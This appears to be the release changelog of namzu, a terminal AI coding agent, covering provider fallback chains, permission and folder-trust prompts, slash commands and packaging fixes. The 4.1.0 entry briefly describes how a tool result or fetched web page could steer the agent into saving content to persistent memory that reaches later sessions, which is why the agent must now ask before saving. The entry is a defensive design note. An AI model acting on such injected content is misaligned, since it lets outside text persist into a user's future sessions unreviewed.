  dependencies, not about the provider. Four consumers read the registry as truth
  and only `constructProvider` knew better; now they all read the same answer.

  What changes for an operator:

  - **The picker** still lists a discovered-but-unbuildable provider, marked
    `unavailable in this build`, and refuses to accept it with a message naming
    the providers that do work. Hiding the row was rejected: someone whose only
    local server is one of these would see "No providers detected", which is
    false.
  - **A saved primary** naming one is refused when preferences are read, which
    routes to the picker with the reason. This is the fix — refusing later, at
    construction, is what produced the dead end.
  - **`writePreferences`** refuses to save one as a primary.
  - **A fallback** naming one is unchanged: dropped from the chain at launch with
    a notice, session runs. Refusing the whole file over a spare would take away
    a working primary.

  No dependencies were added. Bundling the three drivers is a supply-chain
  decision with a real cost — one pulls a large cloud SDK into every install —
  and it belongs to the owner. This change makes the entries stop lying either
  way; wiring any of them later is a one-line flag flip plus a switch arm, held
  in agreement by a test. Closes #257.

## 4.3.1

### Patch Changes

- 5b6adcf: The status bar no longer truncates away the keys it is there to advertise

  The footer is one line that cuts off at the terminal edge, and the hint — the
  only place any key is named — sat at the end of it. So the hint is what got cut.
  At an ordinary 100-column terminal it disappeared entirely, and not only on a
  deep path: a realistic provider and model fill the line between the working
  directory and the hint, so even `/home/dev/api` lost it.

  That made a set of recent fixes invisible rather than wrong. The trust gate
  advertising `Esc`, the permission prompt naming every key that decides it, and
  the picker naming its exits all exist on screen in exactly one place, and on a
  normal terminal that place had already been cut off.

  The line is now budgeted before it is drawn. The hint and the run state are
  never dropped; everything else yields, in the order of what can be recovered
  some other way:

  1. **usage** and **the context gauge** — `/cost` prints both exactly.
  2. **the provider label** — the longest segment and the least distinctive, since
     the model name implies it.
  3. **the working directory**, shortened from the left so the leaf directory
     survives — `…/packages/core` still tells you where you are.
  4. **the model**, and only then the path entirely.

  Nothing changes on a wide terminal with a short path, which is where this looked
  fine all along.

## 4.3.0

### Minor Changes

- b0f166b: **`namzu doctor` now reports provider-chain capability disagreements.** It
  listed which members had credentials and could not say whether the chain it was
  describing could run at all — so a chain with every key in place reported
  `pass`, and the operator found out it was unusable by trying to start a session.

  Reading what a provider declares requires that provider's package to be
  registered, and the only registration path was module-private inside the
  interactive session. A diagnostic that cannot see what the thing it diagnoses
  sees is checking the wrong thing. `ensureRegistered` and
  `resolveChainCapabilities` now live beside the registry, in
  `integrations/providers/register.ts`, and the session and the doctor reach them
  without either importing the other.

  `providers.chain` gains three outcomes:

  - **fail** — the members disagree and the mismatch has not been accepted, so a
    session will be refused. Reported ahead of the credential result, because it
    stops every run.
  - **warn** — the mismatch has been accepted. Still named: the session prints it
    on every launch, and a diagnostic that went quiet would disagree with the
    thing it describes.
  - **warn / fail** — a member whose declaration could not be read, listed
    separately from the disagreements because an unanswered question is not a
    conflict. `fail` when it is the primary, which cannot start a session either.

  The cost is named rather than hidden: this check now dynamically imports the
  driver package of every member in the chain. That is the price of reading a
  declaration, on a command whose whole job is to look.

  No behaviour changes inside a session — the registration state is one set in one
  module, as it was, because two copies would double-register and throw.

  Closes #262.

- d52ce59: Leaving the provider picker takes you back where you were

  The picker has two entry points and had one exit between them.

  **`/model` then `Esc` no longer throws away your session.** Cancelling sent you
  to the phase namzu uses for "I tried and cannot serve" — a screen with a
  disabled composer, from which `/model` cannot be typed again. Declining to
  change model cost you the working session you already had. It now returns to the
  chat.

  **`Ctrl+C` works in the picker.** The key handler was switched off for the whole
  picker phase, so on the first screen a new user sees, the interrupt did nothing
  useful: one press armed an exit whose "press again" notice is printed into a
  transcript the picker does not render, and only a second press left. It exits on
  the first press now, and the hint names it.

  **`Esc` on first run exits.** There is no screen behind the picker then, so
  leaving the picker is leaving the program — which is what the empty picker's
  footer has always said `esc` does.

  The hint now says which of the two `Esc` means: `esc keep current` when a
  session is behind it, `esc or Ctrl+C exit` when nothing is.

### Patch Changes

- 6e287fa: A draft is no longer destroyed by a permission prompt, or by interrupting a turn

  The composer stays editable while the agent works, and the docs encourage typing
  a follow-up there. Two separate mechanisms then threw that text away without the
  operator doing anything to ask for it.

  **The permission overlay unmounted the composer.** It was rendered in a ternary
  _against_ the composer, so when the agent asked to run a tool the composer was
  removed from the tree and React discarded its state — the sentence in progress,
  any pasted-text chips, and any pasted images. Nothing was pressed; the prompt
  simply arrived. The overlay and the composer are now siblings, and the composer
  draws nothing while the prompt is up instead of ceasing to exist.

  **Esc cleared the draft while interrupting a turn.** Both handlers fire on one
  keypress: the app aborts the turn and the composer cleared itself. The status
  bar advertises Esc as the interrupt, so following the instruction on screen
  destroyed the draft. A running turn now owns Esc; with nothing running, Esc
  still clears the composer, which is what it is for.

  Nothing is required of you, and nothing looks different until the moment it
  used to lose your text.

- Updated dependencies [52b339e]
- Updated dependencies [5be5007]
  - @namzu/sdk@18.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 4.2.0

### Minor Changes

- 8348589: **A declared provider chain now falls over.** It was validated, doctor-checked and capability-refused, and nothing ever used it — `providers[1..N]` were decoration. They are not any more.

  **If you have one provider, nothing changes.** A one-member chain composes to exactly the previous behaviour, byte for byte, and emits no new events.

  **If you have declared fallbacks, they will now be used.** Your primary still gets its full retry budget first, and a `Retry-After` is still honoured before anything moves — but a rejected credential, a missing model, an exhausted rate limit or an outage now advances to the next member instead of failing the turn. The scope is the turn: your next message starts at the primary again.

  namzu will not fall over on a failure that is a property of your _request_ — a context overflow, a rejected request, a refusal — because the identical request fails identically on the next provider.

  **Every swap is announced.** A new `provider_fallback` run event, `provider.fallback` on the wire, and a transcript line in the CLI naming the member that failed, why, and the member now serving.

  **That announcement is why this is a major.** `RunEvent` and `StreamEventType` are wider, so a consumer that switches exhaustively over either — with no `default` and a `never` check — stops compiling until it adds an arm. That is not a hypothetical: the SDK's own A2A mapper, SSE mapper and run reporter all do it, and the compiler named all three in this change, exactly as it did in 12.0.0 when `plan_completed` and `plan_failed` were added and that release went out as a major for this reason. Widening a union a consumer reads is a break in this repo whatever the ecosystem convention is; the fix is one `case` per new member.

  **A fallover loses the prompt cache**, so the rest of the turn re-reads your whole context at full price. That is the largest single cost of running a chain and it is worth ordering the chain accordingly.

  **Breaking for one combination, and only that one:** `query()` now throws `invalid_config` when `pricing` is passed together with a chain of more than one member. One pricing table cannot price two members, so the reported total — and `runConfig.costLimitUsd`, which is enforced from it — would be wrong by an unbounded margin and silently so. To keep pricing, declare one member; to keep the chain, drop `pricing`. No existing caller can hit this, because the chain is only reachable through the new `fallbackProviders` option.

  New in `@namzu/sdk`: `withProviderFallback`, `ProviderChainMember`, `WithProviderFallbackOptions`, `QueryParams.fallbackProviders`, `StreamChunk.fallback`, `ProviderFallbackNotice`.

  A fallback with no credential is left out of the chain and named at launch, rather than discovered as a 401 on the day your primary goes down. Sub-agents resolve their provider independently and do not inherit the chain.

### Patch Changes

- Updated dependencies [8348589]
  - @namzu/sdk@17.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 4.1.0

### Minor Changes

- de3d19a: `save_memory` now asks before it writes

  The CLI decided which tools could skip the permission prompt from a
  hand-maintained list of names called `READ_ONLY_TOOLS`. Three tools on it —
  `save_memory`, `task_create` and `task_update` — declare `readOnly: false` in
  the SDK. A constant asserted the exact property it was getting wrong, which is
  how the disagreement survived: nothing reading it had reason to doubt the name.

  **`save_memory` comes off, and this is the user-visible change.** It writes
  content that outlives the run: what is saved now is retrievable by
  `search_memory` in a later session, out of `<cwd>/.namzu/memory` inside your own
  project. So a tool result or a fetched page that talks the model into saving
  something reaches a future run's reasoning. It is not injected into the prompt
  automatically — that is `MEMORY.md`, a different thing — but retrievable is
  enough. A write that survives the process is not read-only under any reading.

  If the agent saves memories often in your workflow, you will now see a prompt
  where you did not. Approve-all (`a`) covers the session, and a
  `{"permissions": {"save_memory": "allow"}}` rule in `namzu.config.json` covers
  it permanently.

  **`task_create` and `task_update` stay exempt, honestly labelled.** They are the
  model's own plan for the current request, written several times per planning
  turn, and prompting each would put a consent dialog between the agent and its
  todo list. They now live in a set named `PROMPT_EXEMPT_WRITES` — an override
  that says it is one — with the reason recorded per entry, and `/permissions`
  discloses them.

  **The read-only half is no longer a list of names.** It is each tool's own
  `isReadOnly()` declaration, resolved against the live registry at the moment of
  the call, so a tool server's tools and the deferred task tools are covered too.
  A name list in the consumer is a second source of truth: a new read-only tool
  missing from it merely gets prompted, but a _renamed_ tool silently changes
  posture with nothing to notice.

  Two comments claimed these tools "touch only the agent's own `~/.namzu` state".
  They write to `<cwd>/.namzu` — the working directory, not the home directory.
  Both are corrected.

  `/permissions` also now names the built-in safety gate, which hard-denies a
  narrow set of catastrophic shell patterns in every mode and which no flag can
  switch off. The page claimed to describe what decides a tool call "in the order
  it actually decides it" and began one step in; a true-but-incomplete order is
  still a wrong order.

## 4.0.1

### Patch Changes

- 93efce0: `/permissions` reports the approval posture actually in force

  The page whose whole job is to answer "how do tool calls get approved here" gave
  two answers that were not true.

  **It could not see "approve all".** Pressing `a` at a prompt sets a latch that
  approves every later tool batch for the rest of the session. That latch lived
  inside the agent session's closure and nothing exposed it, so `/permissions`
  reported the posture from your flags alone and kept printing _"Unreviewed calls:
  you are asked before they run"_ after you had turned exactly that off. One
  keystroke inverted a security posture and the surface that exists to report it
  could not know. It now reports approve-all as automatic approval, says how to
  get back to being asked, and reads the latch when it renders rather than
  inferring it.

  **It never mentioned that some tools are never prompted for.** `read`, `glob`,
  `grep`, `ls`, and the memory and task tools run without asking, always. That is
  deliberate and defensible, but it is undiscoverable by using namzu — the calls
  simply never appear, so their absence reads as "the agent did not use any". The
  readout now names the set, taken from the same list the gate consults so the two
  cannot drift, and states the two limits honestly: a rule can still deny one, and
  anything flagged destructive is prompted for even if it is on the list.

  Two smaller corrections on the same page:

  - **Rules are described instead of named.** `describeRule` handled two of the
    eight rule types and printed the bare type name for the rest. A `permissions`
    table compiles every per-pattern entry to `custom_pattern`, so the commonest
    real config — `"git push*" = "deny"` — was reported to its author as the
    single word `custom_pattern`. All eight are spelled out now, with a `never`
    guard so a ninth fails the build rather than printing itself. A compiled
    pattern is shown as the regex it compiled to, which is not what you typed;
    that is the form that actually decides, and inventing a prettier one would be
    reporting a rule that is not in force.
  - **It pointed at TOML syntax for a JSON file**, telling you to add a
    `[permissions]` table to `namzu.config.json`.

  No public API changes; `SlashContext` is internal to the CLI.

## 4.0.0

### Major Changes

- 167dbb6: Enter no longer grants folder trust

  **Press `y` to trust a folder.** `Enter` now grants nothing at the trust gate.
  If you accept by reflex with `Enter`, that reflex has to change.

  This is the same defect as "Enter no longer approves a tool-permission prompt"
  in the previous release, at the screen before it — and the pair is worth reading
  as a class rather than as two incidents. Both screens asked the operator to
  permit something, both accepted the key people press to dismiss whatever just
  appeared, and neither named that key anywhere on itself. The first one looked
  like a slip. The second says it was a habit, so the rule is now written down
  once, in `consent-timing.ts`, where the next screen of this kind will inherit it.

  The trust gate is the sharper of the two:

  - **The keystroke is near-certain, not merely possible.** You reach this screen
    by typing `namzu` and pressing Enter. A key repeat, a buffered second press,
    or an impatient double-tap arrives while the gate is still painting — the one
    moment in the program where an in-flight Enter should be expected.
  - **The decision is durable.** Approving a tool call runs one tool. Accepting
    here writes the folder into `~/.namzu/trust.json`, which covers every
    subfolder, so a stray keystroke grants standing permission to a whole tree.

  What changes:

  - **`y` grants trust; `Enter` does nothing.**
  - **`y` is ignored for 350ms after the gate appears**, so a keystroke aimed at
    the shell behind it cannot land on it.
  - **Refusal is never deferred.** `n`, `Esc` and `Ctrl+C` exit on the first
    press. Nothing has been written and nothing has run, so an accidental refusal
    costs a relaunch — the recoverable direction — and a hesitating escape hatch
    on the program's first screen would read as a hang.
  - **`Esc` is now advertised.** It always exited; it said so nowhere.

  `permission-timing.ts` is renamed `consent-timing.ts`, since it now governs both
  consent screens. It is internal to the CLI and not part of the published API.

## 3.0.0

### Major Changes

- cf7c14f: Enter no longer approves a tool-permission prompt

  **Press `y` to approve.** `Enter` now decides nothing at the permission
  overlay. If you approve by reflex with `Enter`, that reflex has to change — this
  is the whole of the break, and it is deliberate.

  The prompt appears on the agent's schedule, not yours. The composer stays
  editable while a turn runs, and the docs encourage typing a follow-up there, so
  the overlay can take the screen while your hands are mid-sentence in the
  composer behind it. `Enter` is the key most likely to be already in flight at
  that moment — it is how you send the message you were typing — and it was wired
  to the approving branch. The result was that the keystroke sending your
  follow-up could approve a tool call you had not read. Approving is the one
  decision at this prompt that cannot be undone, so it should not be reachable by
  the key people press to dismiss whatever just appeared.

  `Enter` was named as an approval in `docs/cli/tools.md` and nowhere else: not on
  the overlay, not in the status hint. The overlay now names every key that
  decides it — `y` approve, `n` / `esc` reject, `a` approve all — and names no key
  that does not.

  Two smaller changes come with it:

  - **An approving key is ignored for 350ms after the prompt opens.** `y` and `a`
    are ordinary letters, so someone mid-word when the overlay mounts was one
    keystroke from approving. Refusal is never deferred: `n`, `Esc` and `Ctrl+C`
    answer on the first press, because a refusal you did not mean costs a retry
    and an approval you did not mean costs whatever the tool did.
  - **`Esc` is now advertised on the overlay.** It always rejected; it said so
    nowhere.

### Minor Changes

- 1674ba2: Preferences hold an ordered chain of providers, not one

  `~/.namzu/preferences.json` now stores `providers`, an ordered list, in place of
  the single `provider` + `model` pair. Index 0 is the primary and is what runs.

  **Nothing is required of you.** A `version: 2` file is read as a one-member
  chain — one provider is a one-element list, which is unambiguous — and is
  rewritten in the new format the next time a choice is saved. A `version: 1` file
  is still refused, as before. Downgrading namzu after a chain has been written
  reports "please re-pick" rather than silently dropping the members it cannot
  represent.

  **Only the primary runs today.** Automatic failover is a separate change; this
  one is the configuration it will read. Declaring a longer chain is still worth
  doing now, because the whole of it is checked:

  - Every member must name a provider namzu knows, **including members after the
    first**. A fallback that names a provider that does not exist used to load
    fine and fail at construction — on the day the primary went down, which is the
    worst moment to discover it.
  - A member may not repeat an earlier one exactly. The same provider with a
    _different model_ is allowed, and is a real chain: a large model falling back
    to a smaller one.
  - The chain may not be empty.

  A rejected chain names the position that broke it (`primary provider`,
  `fallback #1`, …) and re-opens the picker.

  `namzu doctor` gained `providers.chain`, which prints the chain in your declared
  order with each member's credential state, so the order is legible without
  launching the TUI. A fallback with no credential is a warning; a primary with
  none is a failure.

  `namzu run --provider <id>` now **replaces** the chain for that run rather than
  re-heading it, so a run you scoped to one provider cannot be answered by a
  different one. `--model` on its own re-models the primary and leaves the rest of
  the chain in place. Neither changes what a single-provider setup does today.

  Adds the `providerChainCheck` export for embedded consumers assembling their own
  doctor registry.

  `namzu doctor` also indents every line of a multi-line check message. Previously
  only the first line took the report's indent and the rest broke out to column 0,
  so a multi-line answer read as though the report had ended.

- 173b93c: Refuse a provider chain whose members declare different capabilities

  namzu negotiates capabilities once per run, against the provider it was handed,
  and that answer decides whether tools go into the prompt and whether image and
  document attachments are mapped. A chain whose members disagree cannot be
  honoured by taking the strongest declaration — a run that fell over to a weaker
  member would arrive holding a request shaped for a provider no longer serving
  it.

  Nor by taking the weakest. That is the trap this refuses to walk into: an
  operator who adds a weaker fallback to gain resilience would find their
  **primary** had quietly lost tool support, on every run, to guard against a
  failure that happens rarely. A capability given up permanently for a rare
  benefit, with nothing saying so.

  So neither is chosen for you. A disagreeing chain is refused, naming which two
  members disagree and on what:

  ```
    - fallback #1 (<label>) declares it cannot call tools, while primary provider
      (<label>) declares it can call tools — if the chain falls over to it, tools
      become unavailable.
  ```

  Every disagreeing capability is listed, not just the first, so the configuration
  can be fixed in one pass rather than one round-trip at a time.

  **To accept the limitation**, set `"allowCapabilityMismatch": true` in
  `~/.namzu/preferences.json`. The chain then runs and the disagreement is printed
  on **every** launch — the TUI, `namzu run`, and a `notice` event on
  `namzu run-stream`. Not once: an acceptance given once and forgotten is how a
  silent degradation returns through the front door.

  Two limits, stated because a check that overstates its authority stops being
  believed:

  - It compares **declarations**, at the type level. That is what is knowable
    without constructing a provider, and constructing one needs a credential —
    which the fallback nobody has set up yet does not have. The runtime treats a
    constructed provider's own declaration as authoritative.
  - It says nothing about the current run. Only the primary runs today, so its
    capabilities are in force in full; every sentence is about what happens _if
    the chain falls over_. When failover lands, the run-level statement becomes
    true and can be made then.

  A member whose declaration cannot be read — a provider with no construction path
  yet — is reported as unresolved rather than assumed to agree, and does not by
  itself refuse the chain.

  Adds `AgentSession.configNotices`, the channel these are surfaced on.
  Single-provider setups are unaffected and gain no new output.

## 2.6.1

### Patch Changes

- Updated dependencies [61b5cc8]
  - @namzu/sdk@16.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 2.6.0

### Minor Changes

- 01856b7: You can type a credential into a running namzu instead of restarting.

  With no key discovered, the picker used to list three sources and say "then
  restart namzu" — accurate, and a cliff: the product told you to leave it in
  order to use it. It now also offers `k`, which takes a key and starts the
  session with it.

  **Held in memory for that session only, and written nowhere.** The screen says
  so before you type and again afterwards, and names the environment variable that
  makes it durable.

  That is a decision, not an omission. The obvious durable home is the OS
  keychain; namzu's keychain support is macOS-only and reads a _different_
  product's credential store, so a key written there would be filed under someone
  else's name — and on Windows there is no keychain path at all. The remaining
  option was a plaintext file. A secret at rest should be something you chose, not
  something that arrived because you typed into a text field.

  - **Masked while typing** — never the key, and never its length either, since
    length distinguishes vendors and tiers.
  - **Checked at the moment you type it**, by listing models, which costs nothing.
    A rejected key leaves you on the screen with what you typed intact.
  - **Never claims a check it did not do.** A provider with no cheap way to
    validate a key is reported as exactly that, with the first message named as
    the real test.
  - **Never reaches a transcript or an error.** Errors carry the provider's
    reason, truncated, and the function that writes the message is not given the
    key.

  A typed credential shows as `typed · this session only` wherever providers are
  listed.

- 857c129: `/model` now picks a model.

  It re-opened the **provider** list, and the model was always the provider's
  default. So someone who wanted a different model typed the obvious command,
  chose a provider, and nothing changed — the command was named for the thing it
  did not do.

  The chain was wired end to end except one link: `Picker`'s `onSubmit` accepted
  `{ provider, model? }`, the app wrote `model` into preferences, and a session
  read `prefs.model ?? entry.defaultModel`. The picker never produced a model.

  `/model` is now two steps — provider, then model. `esc` steps back to the
  provider list rather than out. The model step starts on the one already in
  force, so re-opening it does not quietly reset you to the default. Your choice
  is written to `~/.namzu/preferences.json` and is what the next turn is sent with.

  **When the list is unavailable, the picker says which unavailable it is.** Asking
  a provider for its models can end four ways — it answered with none, it did not
  answer inside 3 seconds, the driver has no listing capability, or it errored —
  and all four used to arrive as an empty array. Three of them are not "this
  provider has no models", and the timeout is the one you can do something about.
  Each now shows its own line, and the provider's default stays selectable in every
  case, so the step is never a dead end.

  Host UIs consuming `namzu providers-json` are unaffected: that command still
  renders any failure as an empty list, and is now the only caller that discards
  the reason.

## 2.5.0

### Minor Changes

- 68eb7ef: Your own slash commands now work in `namzu run` and `namzu run-stream`, not only
  in the terminal agent.

  Before this, `namzu run "/review src/parse.ts"` sent that string to the model as
  prose. The model tried to make sense of it and answered about something else, at
  exit 0 — the command had not failed, it had quietly done something different.
  Running one from a script is most of the reason to write one, so this was the
  larger half of the feature missing rather than a boundary.

  **A leading `/` still does not make something a command.** `namzu run
"/usr/local/bin is missing"` is an ordinary prompt and is sent as written. What
  makes it a command is the first word naming one your project declares: a file in
  `.namzu/commands/` is an explicit declaration, and a word that merely starts with
  a slash is not. Prompts that begin with a slash keep working.

  Built-in commands are interactive and do nothing headless. A prompt that is
  exactly one — `namzu run "/help"` — is refused with a message instead of being
  sent, because nobody means that literally. `namzu run "/clear the cache in
redis"` passes through untouched; the extra words are what distinguish a request
  from an invocation.

  A command that cannot run — arguments a template has no `$ARGUMENTS` to receive,
  or frontmatter that will not parse — exits non-zero with the reason and sends
  nothing. A script continuing on a misfired command is the outcome worth
  preventing.

## 2.4.0

### Minor Changes

- 997b8dd: A markdown file is now a slash command.

  ```
  ~/.namzu/commands/<name>.md      everywhere
  <cwd>/.namzu/commands/<name>.md  this project
  ```

  `review.md` becomes `/review`, and the body is the prompt it sends. A project
  command shadows a user one of the same name — the same precedence skills use.
  Frontmatter is optional; only `description` is read, and it is what `/help` and
  the autocomplete dropdown show.

  **Arguments go through `$ARGUMENTS`.** `/review src/parse.ts` substitutes the
  path wherever the token appears. A template with no `$ARGUMENTS`, invoked with
  arguments, is **refused** — it names your file and the token to add. Running it
  would discard what you typed, and a command that silently ignores half its input
  is worse than one that stops. A template with no token and no arguments is a
  static prompt and runs normally.

  Refusing is the reversible direction. Relaxing it later, by appending arguments
  somewhere, breaks nobody; tightening an append into a refusal would break
  everyone who had come to rely on it.

  **A file that will not load is refused, not skipped.** It stays in `/help`
  marked `⚠` with the parse error, and the rest keep working. A file named after a
  built-in is listed the same way rather than silently ignored — built-ins always
  win, and its author needs to know why theirs never ran.

  Files are read when the session starts; `/model` or a restart picks up a new
  one.

## 2.3.0

### Minor Changes

- d29174e: A `SKILL.md` written on Windows now works.

  The skill reader carried its own frontmatter regex, `/^---\n…\n---\n?/`, which
  is LF-only. A file saved with CRLF line endings — the Windows default — matched
  nothing, so the entire file was treated as body and the skill was listed under
  its directory name with `(no description)`. It never failed; it described the
  skill wrongly, which is why it survived this long.

  It now reads through `parseFrontmatter` from `@namzu/sdk`, so LF, CRLF and a
  lone CR all parse identically, a BOM is handled, and frontmatter keys can no
  longer reach `Object.prototype`.

  **One behaviour changed on purpose.** Frontmatter you _leave out_ is still fine
  and still documented: a file with no `---` fence is all body. Frontmatter you
  _open and get wrong_ is now refused instead of being treated as absent. The old
  answer put the unreadable YAML into the body, where it reached the model
  verbatim under a skill named after its own directory.

  A refused skill does not take the roster with it. It stays in `/skills` marked
  `⚠` with the parse error, so a file you can see on disk is accounted for, and
  `/skill <name>` declines to activate it rather than injecting nothing.

  If you have a `SKILL.md` whose frontmatter never parsed, you will now be told —
  that is the change, and the skill was not working before either.

## 2.2.0

### Minor Changes

- dec2c7a: New `/init` slash command: writes an `AGENTS.md` describing the current project
  to future agents.

  It works by asking the agent, not by generating a template. The kernel already
  reads the tree and writes files, so `/init` composes an instruction and drives an
  ordinary turn — a CLI-side generator would produce a directory listing with
  headings on it, and would become a second way to inspect a repository that then
  disagreed with the one the model uses.

  The instruction it sends is the substance. It asks for every claim to be verified
  against the tree and for omission over invention, in those words, because an
  `AGENTS.md` full of plausible-looking conventions is worse than no file at all:
  the next agent obeys it.

  It knows what is already there. When project instructions are loaded, `/init`
  names them and asks for proposed edits rather than a rewrite; when there are
  none, it asks for a new file at the repository root. The session already reports
  which instruction files are in force, so nothing is discovered to answer this.

  Without a provider it says so and stops, since there is no agent to ask.

### Patch Changes

- Updated dependencies [b31a41f]
  - @namzu/sdk@15.1.0

## 2.1.1

### Patch Changes

- 48d9d67: Published tarballs no longer contain test files.

  `files: ["dist", "src", ...]` reads as "the build output and the sources" and
  means "everything the compiler emitted and everything in the tree", so every
  compiled test, its declaration, and both source maps shipped to the registry —
  and for the twelve packages that also ship `src`, the raw test sources went with
  them.

  Measured on the versions currently published:

  | package      | files       | of which tests | unpacked           |
  | ------------ | ----------- | -------------- | ------------------ |
  | `@namzu/sdk` | 3879 → 2239 | 1640 (42%)     | 12.73 MB → 6.81 MB |
  | `@namzu/cli` | 462 → 282   | 180 (39%)      | 1.21 MB → 0.73 MB  |

  Nothing you can import changes. Every package restricts `exports` to `"."`, so
  Node refused a deep subpath into those files already — they were weight in the
  tarball and nothing else. Hence `patch`: there is no consumer-visible surface
  here, only less to download.

  The exclusions are at the packaging layer, not the compiler. Adding `exclude`
  to `tsconfig.json` would have kept tests out of `dist` and also dropped them
  from `tsc --noEmit`, silently ending type-checking of the entire test suite —
  trading a packaging defect for a much worse one.

- Updated dependencies [1cc83a5]
- Updated dependencies [48d9d67]
  - @namzu/sdk@15.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 2.1.0

### Minor Changes

- 8fa51f8: Three new slash commands in the terminal agent: `/cost`, `/permissions` and
  `/agents`.

  - **`/cost`** — tokens and spend for this run, exact rather than the status
    bar's abbreviation. It states that the figure is cumulative spend and not
    context fill, because those are different quantities and reading one as the
    other is a mistake this codebase has already made once.
  - **`/permissions`** — whether an unreviewed tool call is asked about or
    approved automatically, plus the `allow`/`deny` rules from your
    `namzu.config.json`. It also states the precedence, which is the part people
    get wrong in the dangerous direction: a rule decides first, so the bypass flag
    can never reopen what a `deny` closed.
  - **`/agents`** — the delegates this session can dispatch to, or a plain answer
    that there are none.

  Nothing new is computed. Every figure these print was already produced by the
  kernel and thrown away at the edge: usage arrives on the run's own event stream,
  the permission rules were compiled before the session opened, and the delegate
  roster is decided when the subagent runtime is built. They were reaching the
  status bar in abbreviated form, or nowhere at all.

  `AgentSession` gains a readonly `agentIds` field so the roster can be reported
  rather than rebuilt to find out. It is internal — `@namzu/cli`'s library entry
  exports the doctor API, the shell and the config loader, and has never exported
  `AgentSession` — so this is additive for consumers.

## 2.0.0

### Major Changes

- 5bac979: Removed the `namzu providers` command and its five subcommands (`ls`, `add`,
  `remove`, `default`, `path`), along with the `~/.namzu/providers.json` profile
  store behind them.

  **What breaks.** `namzu providers add …` and its siblings no longer exist. If a
  script calls them it will now fail with an unknown-command error instead of
  succeeding.

  **Why this is a fix and not a regression: the profiles were never used.** The
  run path resolves credentials through `discoverProviders`, which reads
  environment variables, the macOS Keychain, and local probe URLs. It never read
  `providers.json` — `readProfiles` and `resolveApiKey` had exactly one importer
  between them, the `providers` command itself. So `providers add` wrote a file,
  printed `added profile "<name>"`, exited 0, and the credential was never
  consulted by a single run. The store's `~/.namzu/providers.json` file is now
  inert; you may delete it.

  The failure was worse than an unused file, because two shipped commands
  disagreed about your credentials: `providers ls` reported a key with
  `source: file` while `namzu doctor` reported no credentials at all, since they
  read different stores.

  **What to do instead.** Set the provider's environment variable — the same one
  you already set for anything else:

  ```bash
  export ANTHROPIC_API_KEY=sk-ant-…    # or OPENAI_API_KEY, OPENROUTER_API_KEY
  ```

  This is what the run path, the TUI picker and `namzu doctor` have always read,
  and they agree with each other. On macOS an Anthropic OAuth credential in the
  login Keychain is also picked up automatically. To see what is detected, use
  `namzu doctor` or `namzu providers-json` — the latter is a different, live
  command that is not affected by this removal.

  **Why removal rather than wiring it up.** The command's own header declared it
  an unfinished milestone: _"Live provider instantiation … is M3 work and not done
  here; M2's job is purely store + retrieve + display."_ That wiring never
  arrived, and finishing it is a feature rather than a fix. The gap was also far
  wider than the credential: `providers add` accepted seven `--type` values while
  the run path can register four (`bedrock`, `http` and `lmstudio` throw
  `provider "<id>" is not wired yet`), and it accepted nine options of which the
  detection model has fields for two. Wiring only the API key would have left a
  command whose success message was still mostly false.

  Nothing documented it — no page under `docs/`, no README — so no documented
  promise is broken by its removal.

## 1.0.1

### Patch Changes

- ee1aa38: Remove references that pointed readers at a directory they can never open.

  Agent working memory in this repository is gitignored, and several published
  artifacts cited paths inside it. None of them resolved for anyone but the
  maintainer, and four cited session folders that no longer exist at all.

  What a consumer sees change:

  - `@namzu/sandbox` raised `Sandbox backend 'x' is not implemented yet. Track
progress in vendor/namzu/docs.local/sessions/ses_004-...` — a runtime error
    instructing the reader to open a path that is not in the package, not in the
    repository, and not on the internet. It now names what does ship instead.
  - `@namzu/computer-use`'s README linked to an adapter-pattern document under a
    directory that does not exist in any checkout. It now links to the two
    published pages that actually carry the adapter contract, the capability
    protocol, and the platform command matrix.
  - `@namzu/cli`'s README linked to a session folder on the code host that
    returns 404, to explain the doctor's protocol/runtime split. The split is now
    explained in the sentence itself.
  - `@namzu/sdk` source comments cited design documents by path. They cite the
    session by name instead, which is what the reference was ever worth.

  No API, type, or behaviour change. The `@namzu/sandbox` message text is the
  only runtime string affected, and nothing asserts on it.

- Updated dependencies [ee1aa38]
  - @namzu/sdk@14.0.7

## 1.0.0

### Major Changes

- 90e1bba: `namzu run` and `namzu run-stream` refuse a folder nobody has trusted

  **This breaks every headless run in a folder you have not opened namzu in.**
  Migration is one of two things, and both are below.

  namzu's trusted-folder store says in its own header that a folder must be
  trusted "before namzu reads, runs commands in, or edits files in" it. That was
  true of the interactive TUI and false of everything else: the trust check had
  exactly one caller. So

  ```bash
  git clone <someone else's repository> && cd <it>
  namzu run "what does this do?"
  ```

  read that repository's files, ran commands in it, and executed its code — with
  tools auto-approved, because a headless run has nobody to ask. Nothing asked
  you whether you trusted it, because there was no way to ask.

  Both one-shots now check first, before a session is constructed and before
  anything in the directory is read.

  **What to do**

  - Run `namzu` in the folder once and accept the trust prompt. That is
    remembered, covers every subfolder, and is a one-time thing per project.
  - Or pass `--trust`, which accepts the folder **for that run only**. It does
    not write anything down — one reflexive use must not change your machine's
    state forever. For CI this is the intended form: it lives in the job
    definition, where a human reviewed it.

  `--yolo` / `--dangerously-skip-permissions` do **not** imply `--trust`, and
  neither does `--permission-mode`. Those say which tool calls may run inside a
  folder; trust says whether the folder may be worked in at all. Letting an
  existing flag satisfy a new gate is a gate satisfied by accident.

  **How a refusal looks**

  `namzu run` prints the folder and both ways forward, and exits **77**
  (sysexits `EX_NOPERM`). Its own code, because a caller has to tell "you have
  not trusted this folder" — fixable by a human decision — from `64` (your
  arguments are wrong) and `1` (the run failed). `namzu run-stream` emits the
  same explanation as an `{"kind":"error"}` event and then `{"kind":"done"}`, and
  also exits 77: it is the one case where that command exits non-zero, because
  its usual "errors are in-band, exit 0" contract is about a run that started and
  failed, which a host may retry, and this is a refusal to start, which retrying
  cannot fix.

  **What this does not do.** It is not a sandbox. It does not protect a folder
  you trusted that later turns hostile — a pull can bring in anything, and trust
  is a statement about a location rather than its current contents. It does not
  constrain anything inside a trusted folder, where your `permissions` rules and
  the safety gate remain the only controls. It raises the floor from "nobody was
